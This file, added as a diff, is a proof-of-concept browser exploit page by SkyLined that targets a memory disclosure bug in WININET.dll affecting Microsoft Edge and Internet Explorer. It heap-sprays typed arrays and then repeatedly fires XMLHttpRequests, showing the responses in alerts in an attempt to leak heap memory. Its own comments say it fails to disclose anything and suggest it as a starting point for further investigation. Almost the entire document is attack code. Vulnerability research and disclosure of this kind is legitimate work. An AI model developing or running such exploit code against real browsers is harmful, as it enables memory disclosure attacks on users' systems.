@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      // This PoC attempts to exploit a memory disclosure bug in WININET.dll
+      // that affects Microsoft Edge and Internet Explorer. However, it fails
+      // to reveal any information as intended. You might want to use this as
+      // a starting point for further investigation.
+      // See http://blog.skylined.nl/20161110001.html for details.
+      window.onerror = function (a, b, c) {
+        alert([a,b,c].join("\r\n"));
+      }
+      var aauHeap = [];
+      function spray() {
+        aauHoles = [];
+        for (var u = 0; u < 0x10000; u++) {
+          var auHole = new Uint32Array(0x200 / 4);
+          aauHoles.push(auHole);
+          auHole[0] = 0xDEADBEEF;
+          auHole[1] = 0x0D0A0D0A;
+          auHole[2] = 0x0;
+          var auHeap = new Uint32Array(0x200 / 4);
+          aauHeap.push(auHeap);
+          auHeap[0] = 0x41424344;
+          auHeap[1] = 0x0D0A0D0A;
+          auHeap[2] = 0x0;
+        }
+      };
+      function sendRequest() {
+        spray();
+        var oXHR = new XMLHttpRequest();
+        oXHR.open("GET", "Response.http?" + new Date().valueOf());
+        oXHR.send();
+        oXHR.addEventListener("load", function() { 
+          alert("load: " + JSON.stringify(oXHR.status) + " " + JSON.stringify(oXHR.statusText) + "\r\n" +
+              JSON.stringify(oXHR.responseText));
+          setTimeout(sendRequest, 1000);
+        });
+        oXHR.addEventListener("error", function() { 
+          alert("error: " + JSON.stringify(oXHR.status) + " " + JSON.stringify(oXHR.statusText) + "\r\n" +
+              JSON.stringify(oXHR.responseText));
+          setTimeout(sendRequest, 1000);
+        });
+      }
+      sendRequest();
+      // This work by SkyLined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
+    </script>
+  </head>
+</html>
